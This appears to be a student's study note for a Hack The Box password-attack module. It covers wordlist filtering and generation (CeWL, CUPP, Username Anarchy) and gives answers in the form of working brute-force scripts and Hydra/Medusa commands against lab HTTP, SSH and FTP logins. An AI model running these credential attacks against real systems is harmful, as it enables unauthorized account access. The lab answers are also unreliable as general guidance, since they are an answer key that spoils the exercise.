### Content
* Tools:
	* [[Hydra]]
	* [[Medusa]]
* [Custom Wordlists](#custom-wordlists)
* [Edit a wordlist to be tailored to a specific policy with grep](#edit-a-wordlist-to-be-tailored-to-a-specific-policy-with-grep)
* [HTB Module Answers](#htb-module-answers)
---
## Edit a wordlist to be tailored to a specific policy with grep
Suppose we have this policy:
- Minimum length: 8 characters 
- Must include:
    - At least one uppercase letter 
    - At least one lowercase letter 
    - At least one number
    - At least two special characters (from the set `!@#$%^&*`)
``` bash
 grep -E '^.{8,}$' old-wordlist.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > new-wordlist.txt
```
---
## Custom Wordlists
* [Username Anarchy](https://github.com/urbanadventurer/username-anarchy.git) to create personalized username wordlists.
	``` bash
	sudo apt install ruby -y
	git clone https://github.com/urbanadventurer/username-anarchy.git
	./username-anarchy john doe > john_doe_usernames.txt
	```
* [CUPP](https://github.com/Mebus/cupp) to create personalized password wordlists.
	``` bash
	cupp -i
	```
- [CeWL](https://github.com/digininja/CeWL) to scan potential words from the company's website and save them in a wordlist.
	``` bash
	# -d : spider depth, -m : minimum word length, --lowercase : store the words found in lowercase
	cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
	```
---
## HTB Module Answers
* Q1
	``` python
	import requests
	ip = "94.237.51.112"
	port = "40414"
	for pin in range(10000):
	    p = f"{pin:04d}"
	    response = requests.get(f"http://{ip}:{port}/pin?pin={p}")
	    print(f"pin: {p}")
	    if response.ok:
	        print(f"Correct pin: {p}")
	        print(response.json())
	        break
	```
* Q2
	``` python
	import requests
	ip = "94.237.60.32"
	port = "45071"
	passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.split()
	for password in passwords:
	    print(f"Try: {password}")
	    request = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
	    if request.ok:
	        print(f"The correct password: {password}")
	        print(request.json())
	        break
	```
* Q3
	``` bash
	hydra http-get://94.237.53.3:58756/ -l basic-auth-user -P "2023-200_most_used_passwords.txt"
	```
* Q4
	``` bash
	hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f http-post-form://94.237.60.32:33898/:username=^USER^&password=^PASS^:F=Invalid credentials
	```
* Q5
	``` bash
	medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
	# Login and use a session from the target:
	ssh sshuser@<IP> -p PORT
	medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
	ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
	```